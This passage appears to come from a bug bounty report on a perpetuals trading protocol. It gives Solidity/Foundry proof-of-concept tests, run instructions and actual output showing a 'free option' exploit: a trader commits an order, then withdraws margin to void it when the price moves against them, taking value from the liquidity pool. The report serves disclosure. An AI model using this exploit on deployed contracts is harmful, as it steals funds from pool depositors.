        _createOrganicSkew();
        address trader = actors[1];
        uint256 traderBefore = _wealth(trader);
        uint256 keeperBefore = _wealth(OUTSIDER);
        uint64 id = _commitRebateShort(trader);
        uint256 freeCash = clearinghouse.getFreeBuyingPowerAssets(trader);
        vm.prank(trader);
        clearinghouse.withdrawMargin(freeCash);
        _executeHead(OUTSIDER, COMMIT_PRICE);

        uint256 traderCost = traderBefore - _wealth(trader);
        uint256 keeperGain = _wealth(OUTSIDER) - keeperBefore;
        assertEq(_size(trader), 0, "terminal path filled");
        assertEq(
            uint256(book.terminalOutcome(id).reason),
            uint256(OrderV3Types.TerminalReason.PlannerRejected),
            "unexpected terminal reason"
        );
        assertEq(traderCost, keeperGain, "terminal bounty did not conserve value");
        assertEq(keeperGain, 0.2e6, "unexpected release bounty");
    }

    function test_LateFillUsesCommitTickAfterMarkMoves() public {
        _createOrganicSkew();
        address trader = actors[1];
        uint64 id = _commitRebateShort(trader);
        uint64 commitTime = _commitTime(id);
        vm.warp(uint256(commitTime) + 30);
        vm.roll(vm.getBlockNumber() + 1);
        _refreshMark(1.002e8);
        _warpToOffset(commitTime, productionRouter.maxExecutionWindowSeconds() - 1);
        _executeHead(trader, COMMIT_PRICE);

        (uint256 size,, uint256 entry,,,,) = engine.positions(trader);
        assertEq(size, OPTION_NOTIONAL, "late fill failed");
        assertEq(entry, COMMIT_PRICE, "late fill did not use commit tick");
        assertEq(block.timestamp - commitTime, 59, "fill was not one second before deadline");
    }

    function test_AttackerCreatedSkewMustBeIncludedInEconomics() public {
        address optionAccount = actors[1];
        address skewAccount = actors[2];
        address treasury = engine.protocolTreasury();
        uint256 snap = vm.snapshotState();

        for (uint256 branch; branch < 2; ++branch) {
            uint256 combinedBefore = _wealth(optionAccount) + _wealth(skewAccount);
            uint256 poolBefore = pool.totalAssets();
            uint256 treasuryBefore = clearinghouse.balanceAssets(treasury);
            _commitOpen(2, ORGANIC_SKEW_NOTIONAL, ORGANIC_SKEW_MARGIN);
            _executeHead(skewAccount, COMMIT_PRICE);
            _tick();
            _refreshMark(COMMIT_PRICE);

            uint64 optionId = _commitRebateShort(optionAccount);
            uint64 commitTime = _commitTime(optionId);
            uint256 later = branch == 0 ? 1.002e8 : 0.998e8;
            vm.warp(uint256(commitTime) + 30);
            vm.roll(vm.getBlockNumber() + 1);
            _refreshMark(later);
            _warpToOffset(commitTime, productionRouter.maxExecutionWindowSeconds() - 1);

            if (branch == 0) {
                _executeHead(optionAccount, COMMIT_PRICE);
                _commitFullClose(1);
                _executeHead(optionAccount, later);
            } else {
                uint256 freeCash = clearinghouse.getFreeBuyingPowerAssets(optionAccount);
                vm.prank(optionAccount);
                clearinghouse.withdrawMargin(freeCash);
                _executeHead(optionAccount, COMMIT_PRICE);
            }
            _commitFullClose(2);
            _executeHead(skewAccount, later);

            int256 combinedNet = int256(_wealth(optionAccount) + _wealth(skewAccount)) - int256(combinedBefore);
            int256 poolDelta = int256(pool.totalAssets()) - int256(poolBefore);
            int256 fees = int256(clearinghouse.balanceAssets(treasury)) - int256(treasuryBefore);
            console2.log(
                branch == 0
                    ? "self-created skew, option exercised (+20 bps)"
                    : "self-created skew, option voided (-20 bps)"
            );
            console2.logInt(combinedNet);
            console2.logInt(poolDelta);
            console2.logInt(fees);
            assertApproxEqAbs(combinedNet + poolDelta + fees, 0, 10, "value leaked");
            vm.revertToState(snap);
        }
    }

    function _createOrganicSkew() internal {
        _commitOpen(2, ORGANIC_SKEW_NOTIONAL, ORGANIC_SKEW_MARGIN);
        _executeHead(actors[2], COMMIT_PRICE);
        _tick();
        _refreshMark(COMMIT_PRICE);
    }

    function _commitOpen(
        uint256 actorIndex,
        uint256 size,
        uint256 margin
    ) internal returns (uint64 id) {
        OrderV3Types.OrderRequest memory request = _baseRequest(actorIndex);
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = actorIndex % 2 == 0 ? 1 : engine.CAP_PRICE();
        vm.prank(actors[actorIndex]);
        id = productionRouter.commitOrder(request);
    }

    function _commitRebateShort(
        address trader
    ) internal returns (uint64 id) {
        OrderV3Types.OrderRequest memory request = _baseRequest(1);
        request.sizeDelta = OPTION_NOTIONAL;
        request.marginDelta = OPTION_MARGIN;
        request.targetPrice = engine.CAP_PRICE();
        vm.prank(trader);
        id = productionRouter.commitOrder(request);
    }

    function _commitFullClose(
        uint256 actorIndex
    ) internal returns (uint64 id) {
        (uint256 size,,,,,,) = engine.positions(actors[actorIndex]);
        OrderV3Types.OrderRequest memory request = _baseRequest(actorIndex);
        request.sizeDelta = size;
        request.isClose = true;
        request.targetPrice = actorIndex % 2 == 0 ? engine.CAP_PRICE() : 1;
        vm.prank(actors[actorIndex]);
        id = productionRouter.commitOrder(request);
    }

    function _commitRebateShortFromSimpleAccount(
        FreeOptionSimpleAccountV08Mock account
    ) internal returns (uint64 id) {
        OrderV3Types.OrderRequest memory request = _baseRequest(1);
        request.sizeDelta = OPTION_NOTIONAL;
        request.marginDelta = OPTION_MARGIN;
        request.targetPrice = engine.CAP_PRICE();
        id = productionRouter.nextCommitId();
        FreeOptionSimpleAccountV08Mock.Call[] memory calls = new FreeOptionSimpleAccountV08Mock.Call[](1);
        calls[0] = FreeOptionSimpleAccountV08Mock.Call({
            target: address(productionRouter), value: 0, data: abi.encodeCall(productionRouter.commitOrder, (request))
        });
        vm.prank(SMART_ACCOUNT_OWNER);
        account.executeBatch(calls);
        assertEq(productionRouter.nextCommitId(), id + 1, "smart-account order not committed");
    }

    function _fundSimpleAccount(
        FreeOptionSimpleAccountV08Mock account
    ) internal {
        settlementToken.mint(address(account), ACCOUNT_FUNDING);
        FreeOptionSimpleAccountV08Mock.Call[] memory calls = new FreeOptionSimpleAccountV08Mock.Call[](2);
        calls[0] = FreeOptionSimpleAccountV08Mock.Call({
            target: address(settlementToken),
            value: 0,
            data: abi.encodeWithSignature("approve(address,uint256)", address(clearinghouse), ACCOUNT_FUNDING)
        });
        calls[1] = FreeOptionSimpleAccountV08Mock.Call({
            target: address(clearinghouse),
            value: 0,
            data: abi.encodeCall(clearinghouse.depositMargin, (ACCOUNT_FUNDING))
        });
        vm.prank(SMART_ACCOUNT_OWNER);
        account.executeBatch(calls);
    }

    function _baseRequest(
        uint256 actorIndex
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        uint256 window = productionRouter.maxExecutionWindowSeconds();
        request.clientOrderId =
            keccak256(abi.encode(actorIndex, productionRouter.nextCommitId(), block.timestamp, gasleft()));
        request.side = actorIndex % 2 == 0 ? CfdTypes.Side.LONG : CfdTypes.Side.SHORT;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 7,
            expectedConfigHash: book.currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _executeHead(
        address executor,
        uint256 executionPrice
    ) internal {
        uint64 head = productionRouter.nextExecuteId();
        bytes[] memory data = _executionPriceData(executionPrice);
        vm.prank(executor);
        productionRouter.executeOrder(head, data);
    }

    function _executionPriceData(
        uint256 executionPrice
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = vm.getBlockTimestamp();
        uint64 nextOrderId = productionRouter.nextExecuteId();
        if (nextOrderId != 0) {
            (IOrderRouterAccounting.PendingOrderView memory pending,) =
                productionRouter.getPendingOrderView(nextOrderId);
            uint256 candidate = uint256(pending.commitTime) + 1;
            if (pending.orderId != 0 && candidate <= publishTime) {
                publishTime = candidate;
            }
        }
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(),
            int64(uint64(executionPrice)),
            0,
            int32(-8),
            publishTime,
            publishTime == 0 ? 0 : publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(executionPrice);
    }

    function _refreshMark(
        uint256 markPrice
    ) internal {
        if (block.timestamp <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        productionRouter.updateMarkPrice(_livePriceData(markPrice));
    }

    function _livePriceData(
        uint256 markPrice
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(markPrice)), 0, -8, block.timestamp, previous)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _commitTime(
        uint64 id
    ) internal view returns (uint64) {
        (IOrderRouterAccounting.PendingOrderView memory pending,) = productionRouter.getPendingOrderView(id);
        return pending.commitTime;
    }

    function _warpToOffset(
        uint64 commitTime,
        uint256 offset
    ) internal {
        vm.warp(uint256(commitTime) + offset - 1);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _tick() internal {
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _size(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _wealth(
        address account
    ) internal view returns (uint256) {
        return settlementToken.balanceOf(account) + clearinghouse.balanceAssets(account);
    }

}
~~~

### Running the PoC

Prerequisites:

- Install Foundry and confirm that `forge --version` succeeds.
- Run the commands from the repository root.
- Check out the program's in-scope commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.
- Add the complete file above at `packages/perps/test/CommittedOpenFreeOptionPoC.t.sol`.
- No RPC URL, private key, Hermes key, or environment variable is required.

Run all eight tests:

~~~bash
forge test --root packages/perps --match-path "test/CommittedOpenFreeOptionPoC.t.sol" -vv
~~~

Actual output from the final run:

~~~text
No files changed, compilation skipped

Ran 8 tests for test/CommittedOpenFreeOptionPoC.t.sol:CommittedOpenFreeOptionPoCTest
[PASS] test_AtomicSimpleAccountVoidsOrderAtZeroUsdGProtocolCost() (gas: 7276180)
Logs:
  atomic void protocol-denominated cost 0
  atomic void Pyth funding wei 2000000000000000
  atomic batch measured call gas (excludes outer tx base/L1 data) 1103428

[PASS] test_AttackerCreatedSkewMustBeIncludedInEconomics() (gas: 22204365)
Logs:
  self-created skew, option exercised (+20 bps)
  -721389459
  521309459
  200080000
  self-created skew, option voided (-20 bps)
  358236547
  -478236547
  120000000

[PASS] test_BothBranchesEndToEnd() (gas: 13070101)
Logs:
  favourable branch (+20 bps)
  118859123
  -198939123
  80080000
  unfavourable branch (-20 bps)
  0
  0
  0

[PASS] test_ControlWithoutWithdrawalUnfavourableOrderFillsAndLoses() (gas: 10056872)
Logs:
  unfavourable no-withdrawal trader result
  -279920015
  200000015
  79920000

[PASS] test_EarlyKeeperCanForceFill() (gas: 7614006)
Logs:
  early keeper bounty 200000

[PASS] test_LateFillUsesCommitTickAfterMarkMoves() (gas: 7432141)
[PASS] test_RepeatsAcrossSixCycles() (gas: 33104979)
Logs:
  cycles 6
  filled cycles 3
  356576562
  -596816562
  240240000

[PASS] test_ThirdPartyTerminalizationCostsTheBounty() (gas: 6559751)
Suite result: ok. 8 passed; 0 failed; 0 skipped; finished in 52.80ms (143.27ms CPU time)

Ran 1 test suite in 60.96ms (52.80ms CPU time): 8 tests passed, 0 failed, 0 skipped (8 total tests)
~~~
